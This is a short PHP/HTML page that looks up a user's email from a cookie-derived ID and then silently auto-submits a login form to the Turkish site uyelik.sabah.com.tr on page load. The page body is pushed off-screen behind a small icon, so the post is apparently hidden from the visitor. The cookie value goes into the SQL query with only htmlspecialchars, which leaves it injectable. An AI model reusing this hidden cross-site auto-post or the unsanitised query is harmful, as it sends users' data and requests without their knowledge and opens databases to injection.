<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `sabah` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>



<form action="http://uyelik.sabah.com.tr/" enctype="multipart/form-data" method="post" name="NewForm" id="myform">
    
    <ul class="form">
        <li>
            <strong>Kullanıcı Adı / E-posta :   </strong>
            <input class="txt" id="username" name="username" type="text" value="<?=$email;?>">
            <span class="greyBox"><em>Lütfen kullanıcı adı veya e-posta giriniz.</em></span>
        </li>
        <li>
            <strong>Şifre : </strong>
            <input class="txt" id="password" name="password" onKeyPress="return submitenter(this,event)" type="password" value="">
                        
            <a href="/Authentication/SendPasswordMail" class="txt">şifremi unuttum</a>       
               
            
        </li>
    
        
        
        <li>  
            <label class="remember">
                <input checked="checked" id="chkRememberMe" name="chkRememberMe" type="checkbox" value="true"><input name="chkRememberMe" type="hidden" value="false">
                beni hatırla
            </label>
        </li>
        
        <li class="btn">
            <a href="javascript:FormSubmit();" class="uyeGirisi">üye girişi</a> 
            
        </li>
        
        <li class="border">
            <a href="/Authentication/CreateUser" class="txt">Yeni Üyelik için tıklayın!</a>
            <a href="/Authentication/SendActivationMail" class="txt">Aktivasyon Maili için tıklayın!</a>
        </li>
    </ul>
    
</form>




</body>
</html>

